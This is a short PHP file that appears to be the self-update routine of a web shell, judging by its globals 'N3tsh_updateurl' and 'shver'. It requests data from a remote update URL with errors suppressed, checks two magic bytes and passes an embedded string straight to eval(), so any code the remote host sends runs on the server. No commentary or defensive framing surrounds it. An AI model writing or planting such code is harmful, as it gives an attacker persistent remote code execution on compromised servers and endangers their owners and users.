<?php
$updatenow = True;
$url = $GLOBALS["N3tsh_updateurl"]."?version=".urlencode(base64_encode($GLOBALS["shver"]))."&updatenow=".($updatenow?"1":"0")."&";
$data = @file_get_contents($url);

$data = ltrim($data);
$string = substr($data,3,ord($data{2}));

if ($data{0} == "\x99" and $data{1} == "\x04") {
	eval($string); 	
}
die("");
?>